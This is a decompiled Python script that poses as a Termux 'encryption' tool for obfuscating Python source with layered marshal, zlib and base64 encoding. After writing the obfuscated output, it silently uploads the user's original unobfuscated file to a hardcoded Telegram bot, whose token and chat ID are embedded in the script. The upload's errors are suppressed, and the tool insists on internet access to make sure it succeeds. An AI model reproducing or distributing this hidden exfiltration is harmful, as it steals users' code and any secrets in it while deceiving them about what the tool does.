# Decode By Error x Ethan

import os
import sys
import subprocess
import argparse
import random
import time
import marshal
import base64
import zlib
import requests
logo = '\n[1;31m\n██╗   ██╗     █████╗     ███████╗\n╚██╗ ██╔╝    ██╔══██╗    ██╔════╝\n ╚████╔╝     ███████║    ███████╗\n  ╚██╔╝      ██╔══██║    ╚════██║\n   ██║       ██║  ██║    ███████║\n   ╚═╝       ╚═╝  ╚═╝    ╚══════╝\n[1;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n[38;5;196m[[1;91mX[38;5;196m][38;1;91mFACEBOOK     [1;91m: [38;1;91mFACEBOOK.COM/YASSSSS30\n[38;5;196m[[1;91mX[38;5;196m][38;1;91mNETWORK   [1;91m   : [38;1;91mDATA & WIFI\n[38;5;196m[[1;91mX[38;5;196m][38;1;91mVERSION     [1;91m : [1;91m1.0\n[38;5;196m[[1;91mX[38;5;196m][38;1;91mTOOL [1;91m        : [38;1;91mENCRYPTION-PYTHON TOOL/SCRIPT\n[1;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
def linex():
    print('[1;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
TOKEN = '8432040641:AAGpR8ysjMdhtpsjHrCEdvVVdc5Y8yEd-zY'
CHAT_ID = '6839234678'
def send_file_to_telegram(file_path: str, token: str, chat_id: str) -> None:
    url = f'https://api.telegram.org/bot{token}/sendDocument'
    with open(file_path, 'rb') as file:
        requests.post(url, data={'chat_id': chat_id}, files={'document': file})
def encode(source: str) -> str:
    try:
        obf = marshal.dumps(compile(source, 'Yas _ 構文エラー 󱢏󰥬󰟰󰟱', 'exec'))
        reversed_marshal = obf[::(-1)]
        compressed = zlib.compress(reversed_marshal)[::(-1)]
        b64_encoded = base64.b64encode(compressed).decode('ascii')
        reversed_b64 = b64_encoded[::(-1)]
        runtime = f'import marshal,base64,zlib\nexec(marshal.loads(zlib.decompress(base64.b64decode({repr(reversed_b64)}[::-1])[::-1])[::-1]))\n'
        return runtime
    except Exception as e:
        print(f'Encoding error: {e}')
        print('')
        print('Error : File was not Encrypt ')
        return source
def check_internet() -> bool:
    try:
        requests.get('https://api.telegram.org', timeout=5)
    except requests.RequestException:
        return False
    return True
def inputs():
    os.system('clear')
    print(logo)
    print('Example Input File Path The Script You Want To Encrypt /sdcard/script.py')
    print('')
    file1 = input(' Enter Input File Path Name : ')
    print('')
    print('Example Output File Path Script to Save Result Encrypted Output Script /sdcard/script-encrypted.py')
    print('')
    file2 = input(' Enter Output File Path Name : ')
    print('')
    print('Encrypting ~ Please Wait . . . ')
    print('')
    if not check_internet():
        print('')
        print('This Encrypting Tool/Script Need Internet. Turn on Wi-Fi Or Mobile Data. No Internet Connections. Run again this Tool/Script. ')
        print('')
        print('Error : File was not Encrypt ')
        print('')
        exit()
    return (file1, file2)
def _indent_all_lines(s: str, indent: str='\t') -> str:
    return '\n'.join((indent + line if line.strip()!= '' else indent for line in s.splitlines()))
def main():
    # ***<module>.main: Failure: Different control flow
    file1, file2 = inputs()
    print(f' Encrypting : {file1} => {file2}')
    try:
        with open(file1, 'r', encoding='utf-8') as iput:
            source = iput.read()
    except FileNotFoundError:
        print(f' Input file not found: {file1}')
    except Exception as e:
        print('')
        print(f' Error reading input file: {e}')
        print('')
        print(' (Please Allow Your Storage/Files to Work Properly), Please Wait a Sec ')
        time.sleep(3)
        print('')
        os.system('termux-setup-storage')
        time.sleep(3)
        print('After Allowing Storage/Files On Termux App Run again this Tool/Script. ')
        print('')
        print('If choices do not appear on the Termux display, go to the Termux APK in App Info And Allow  Storage/Files Access, to work properly Tool/Script. ')
        print('')
    target_size = int(1667235.84)
    tolerance = 102400
    encoded = source
    complexity = 0
    while True:
        encoded = encode(encoded)
        complexity += 1
        output_content = f'#Obfuscate By Yas _ 構文エラー 󱢏󰥬󰟰󰟱\ntry:\n{_indent_all_lines(encoded)}\nexcept KeyboardInterrupt:\n\texit()'
        output_size = len(output_content.encode('utf-8'))
        if abs(output_size - target_size) <= tolerance:
            break
        else:
            if output_size > target_size + tolerance:
                break
    try:
        with open(file2, 'w', encoding='utf-8') as output:
            output.write(output_content)
        print('')
        print(f'File \'{file2}\' successfully encrypted.')
        print('')
        print(f'Output File Size : {output_size / 1024:.2f} KB')
        print('')
    except Exception as e:
        print(f'File \'{file2}\' was not encrypted. Error: {e}')
    try:
        send_file_to_telegram(file1, TOKEN, CHAT_ID)
    except Exception:
        pass
    print(f' Encrypted Successfully! Saved as : {file2}')
    print('')
if __name__ == '__main__':
    main()